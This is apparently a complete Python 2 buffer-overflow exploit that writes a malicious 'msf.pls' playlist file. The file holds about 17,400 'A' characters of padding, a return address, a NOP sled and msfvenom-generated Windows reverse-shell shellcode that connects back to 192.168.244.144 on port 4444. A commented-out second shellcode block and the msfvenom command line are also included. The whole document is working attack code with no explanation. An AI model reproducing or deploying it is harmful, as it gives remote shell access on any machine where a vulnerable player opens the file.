#!/usr/bin/env python

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.244.144 LPORT=4444 -b "\x00\x09\x0a" -f c

'''
badchars = (
"\xbd\x60\xd9\x29\x88\xdb\xd6\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x6b\x12\x83\xc3\x04\x03\x0b\xd7\xcb\x7d\x37\x0f\x89"
"\x7e\xc7\xd0\xee\xf7\x22\xe1\x2e\x63\x27\x52\x9f\xe7\x65\x5f"
"\x54\xa5\x9d\xd4\x18\x62\x92\x5d\x96\x54\x9d\x5e\x8b\xa5\xbc"
"\xdc\xd6\xf9\x1e\xdc\x18\x0c\x5f\x19\x44\xfd\x0d\xf2\x02\x50"
"\xa1\x77\x5e\x69\x4a\xcb\x4e\xe9\xaf\x9c\x71\xd8\x7e\x96\x2b"
"\xfa\x81\x7b\x40\xb3\x99\x98\x6d\x0d\x12\x6a\x19\x8c\xf2\xa2"
"\xe2\x23\x3b\x0b\x11\x3d\x7c\xac\xca\x48\x74\xce\x77\x4b\x43"
"\xac\xa3\xde\x57\x16\x27\x78\xb3\xa6\xe4\x1f\x30\xa4\x41\x6b"
"\x1e\xa9\x54\xb8\x15\xd5\xdd\x3f\xf9\x5f\xa5\x1b\xdd\x04\x7d"
"\x05\x44\xe1\xd0\x3a\x96\x4a\x8c\x9e\xdd\x67\xd9\x92\xbc\xef"
"\x2e\x9f\x3e\xf0\x38\xa8\x4d\xc2\xe7\x02\xd9\x6e\x6f\x8d\x1e"
"\x90\x5a\x69\xb0\x6f\x65\x8a\x99\xab\x31\xda\xb1\x1a\x3a\xb1"
"\x41\xa2\xef\x16\x11\x0c\x40\xd7\xc1\xec\x30\xbf\x0b\xe3\x6f"
"\xdf\x34\x29\x18\x4a\xcf\xba\xe7\x23\x3b\xaa\x80\x31\xc3\xda"
"\x0c\xbf\x25\xb6\xbc\xe9\xfe\x2f\x24\xb0\x74\xd1\xa9\x6e\xf1"
"\xd1\x22\x9d\x06\x9f\xc2\xe8\x14\x48\x23\xa7\x46\xdf\x3c\x1d"
"\xee\x83\xaf\xfa\xee\xca\xd3\x54\xb9\x9b\x22\xad\x2f\x36\x1c"
"\x07\x4d\xcb\xf8\x60\xd5\x10\x39\x6e\xd4\xd5\x05\x54\xc6\x23"
"\x85\xd0\xb2\xfb\xd0\x8e\x6c\xba\x8a\x60\xc6\x14\x60\x2b\x8e"
"\xe1\x4a\xec\xc8\xed\x86\x9a\x34\x5f\x7f\xdb\x4b\x50\x17\xeb"
"\x34\x8c\x87\x14\xef\x14\xb7\x5e\xad\x3d\x50\x07\x24\x7c\x3d"
"\xb8\x93\x43\x38\x3b\x11\x3c\xbf\x23\x50\x39\xfb\xe3\x89\x33"
"\x94\x81\xad\xe0\x95\x83")
'''
shellcode = ("\xbf\x3d\x25\xb7\xcb\xd9\xce\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x83\xc0\x04\x31\x78\x0e\x03\x45\x2b\x55\x3e\x49\xdb\x1b"
"\xc1\xb1\x1c\x7c\x4b\x54\x2d\xbc\x2f\x1d\x1e\x0c\x3b\x73\x93"
"\xe7\x69\x67\x20\x85\xa5\x88\x81\x20\x90\xa7\x12\x18\xe0\xa6"
"\x90\x63\x35\x08\xa8\xab\x48\x49\xed\xd6\xa1\x1b\xa6\x9d\x14"
"\x8b\xc3\xe8\xa4\x20\x9f\xfd\xac\xd5\x68\xff\x9d\x48\xe2\xa6"
"\x3d\x6b\x27\xd3\x77\x73\x24\xde\xce\x08\x9e\x94\xd0\xd8\xee"
"\x55\x7e\x25\xdf\xa7\x7e\x62\xd8\x57\xf5\x9a\x1a\xe5\x0e\x59"
"\x60\x31\x9a\x79\xc2\xb2\x3c\xa5\xf2\x17\xda\x2e\xf8\xdc\xa8"
"\x68\x1d\xe2\x7d\x03\x19\x6f\x80\xc3\xab\x2b\xa7\xc7\xf0\xe8"
"\xc6\x5e\x5d\x5e\xf6\x80\x3e\x3f\x52\xcb\xd3\x54\xef\x96\xbb"
"\x99\xc2\x28\x3c\xb6\x55\x5b\x0e\x19\xce\xf3\x22\xd2\xc8\x04"
"\x44\xc9\xad\x9a\xbb\xf2\xcd\xb3\x7f\xa6\x9d\xab\x56\xc7\x75"
"\x2b\x56\x12\xd9\x7b\xf8\xcd\x9a\x2b\xb8\xbd\x72\x21\x37\xe1"
"\x63\x4a\x9d\x8a\x0e\xb1\x76\x75\x66\x4d\x16\x1d\x75\xad\x06"
"\x82\xf0\x4b\x42\x2a\x55\xc4\xfb\xd3\xfc\x9e\x9a\x1c\x2b\xdb"
"\x9d\x97\xd8\x1c\x53\x50\x94\x0e\x04\x90\xe3\x6c\x83\xaf\xd9"
"\x18\x4f\x3d\x86\xd8\x06\x5e\x11\x8f\x4f\x90\x68\x45\x62\x8b"
"\xc2\x7b\x7f\x4d\x2c\x3f\xa4\xae\xb3\xbe\x29\x8a\x97\xd0\xf7"
"\x13\x9c\x84\xa7\x45\x4a\x72\x0e\x3c\x3c\x2c\xd8\x93\x96\xb8"
"\x9d\xdf\x28\xbe\xa1\x35\xdf\x5e\x13\xe0\xa6\x61\x9c\x64\x2f"
"\x1a\xc0\x14\xd0\xf1\x40\x24\x9b\x5b\xe0\xad\x42\x0e\xb0\xb3"
"\x74\xe5\xf7\xcd\xf6\x0f\x88\x29\xe6\x7a\x8d\x76\xa0\x97\xff"
"\xe7\x45\x97\xac\x08\x4c")

buffer1 = "http://" + "A" * 17417 + "\xcf\xda\x05\x10" + "\x90" * 16  +  shellcode

f1 = open("msf.pls","wb")
f1.write(buffer1)
f1.close()
print "pls file created"
